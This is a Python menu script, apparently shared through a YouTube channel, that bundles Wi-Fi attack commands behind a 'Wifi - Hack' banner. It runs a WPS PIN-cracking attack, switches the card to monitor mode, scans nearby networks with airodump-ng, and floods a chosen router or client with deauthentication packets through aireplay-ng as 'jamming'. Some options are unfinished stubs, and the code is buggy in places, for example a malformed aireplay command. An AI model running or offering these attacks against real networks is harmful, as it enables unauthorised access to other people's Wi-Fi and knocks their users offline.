#python 
#Youtube chanel name: Real tips & trikes 660
#wifi_hack 
#wps_hack 
#start 
import os
import time
print('Chack Update')
os.system('git pull')
os.system('clear')
black="\033[0;30m"        # Black
red="\033[0;31m"          # Red
green="\033[0;32m"        # Green
yellow="\033[0;33m"       # Yellow
blue="\033[0;34m"         # Blue
purple="\033[0;35m"       # Purple
cyan="\033[0;36m"         # Cyan
white="\033[0;37m"        # White
os.system('clear')
os.system('figlet -f big Wifi - Hack |lolcat')
print(green+'                     Version : 2.0 ')
print()
print(blue+'======================================================')
print(red+'Note: I wont be responsible fo any illigal activites.')
print(blue+'======================================================')
print()
time=1
#main.coding
#________________________________________
import os
import sys
import time
def delay_print(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.1)
delay_print(green+'%37s' % '   |Devoloped By : Raz Ahamed|\n')
print()
print(red+'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
print(blue+'Youtube Chanel: Real  tips and Trikes 660')
print(blue+'Telegarm Grop : https://t.me/realtips6600')
print(red+'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
print('''
[1] Update Tool
[2] WPS HACK
[3] Start Monitor mode
[4] Stop Monitor mode
[5] Super Wifi Monitor 
[6] WPA2/PSK ATTCK
[7] WIFI Jaming
[8] Password Maker
[0] EXIT
  ''')
a=input('Selected Option-:')
if a=='1':
	os.system('apt install ruby -y')
	os.system('apt install figlet -y')
	os.system('gem install lolcat')
	os.system('python3 install.py')
if a=='2':
	os.system('clear')
	os.system('figlet -f big WPS - Hack |lolcat')
	print(green+'Root chack.......')
	os.system('sudo python3 file/wps.py -i wlan0 -K')
	are=str(input(cyan+'Are you continue (y/n):- '))
	if are=='y':
		os.system('python3 wifi.py')
	elif are=='n':
		os.system('exit')
		os.system('clear')
		os.system('figlet -f big Thanks |lolcat')
	elif are=='y ':
		os.system('python3 wifi.py')
	elif are=='n ':
		os.system('exit')
		os.system('clear')
		os.system('figlet -f big Thanks |lolcat')
if a=='3':
				os.system('airmon-ng start wlan0')
				print()
				print(green+'Monitor mode Start Done....')
				time.sleep(5)
				os.system('sudo python3 wifi.py')
if a=='4':
	os.system('airmon-ng stop wlan0')
	print()
	time.sleep(1)
	print(green+'Monitor mode Stop Done....')
	time.sleep(4)
	os.system('sudo python3 wifi.py')
if a=='5':
	print()
	print(green+'STOP TYPE  < CTRL + C >')
	time.sleep(3)
	os.system('airmon-ng start wlan0')
	print()
	os.system('airodump-ng wlan0')
if a=='6':
	print('Captured Handshake')
	def delay_print(s):
	    for c in s:
	        sys.stdout.write(c)
	        sys.stdout.flush()
	        time.sleep(0.10)
	delay_print(green+'Coming soon.......')
	os.system('python3 wifi.py')
		
if a=='7':
	os.system('clear')
	os.system('figlet -f big Ddos Attck |lolcat')
	print()
	print(green+'[ 1 ] Wifi Jamming')
	print('[ 2 ] wifi Clint / user Jamming')
	print()
	x=input(red+'Selected Option-:') 
	if x=='1':
		print()
		mac=input('Router BSSID: ')
		time.sleep(2)
		print()
		print(green+'STOP TYPE  < CTRL + C >')
		time.sleep(3)
		os.system('sudo aireplay-ng -0 9999999 -a'+ mac +'wlan0')
		#os.system('sudo aireplay-ng -0 0 -a BC:62:CE:2A:1C:D4 wlan0')
	if x=='2':
		print()
		mac=input('Router BSSID: ')
		client_mac=input('client / user BSSID: ')	
		time.sleep(2)
		print()
		print(green+'STOP TYPE  < CTRL + C >')
		time.sleep(3)
		os.system('sudo aireplay-ng -0 999999999 -a '+mac+' -c '+client_mac+' wlan0')
		#os.system('sudo aireplay-ng -0 0 -a BC:62:CE:2A:1C:D4
elif a=='8':
		print()
		def delay_print(s):
		    for c in s:
		        sys.stdout.write(c)
		        sys.stdout.flush()
		        time.sleep(0.10)
		delay_print(red+'Comming soon.........')
		os.system('clear')
		os.system('figlet -f big Thanks')
		time.sleep(3)
		os.system('sudo python3 wifi.py')
elif a=='0':
		os.system('exit')
		print()
		def delay_print(s):
		    for c in s:
		        sys.stdout.write(c)
		        sys.stdout.flush()
		        time.sleep(0.10)
		delay_print(red+'EXIT..........')
		os.system('clear')
		os.system('figlet -f big Thanks')
		
			
else:
	print()
	def delay_print(s):
	    for c in s:
	        sys.stdout.write(c)
	        sys.stdout.flush()
	        time.sleep(0.10)
	delay_print(red+'Wrong Input Agin!')
	#os.system('python3 wifi.py')
	
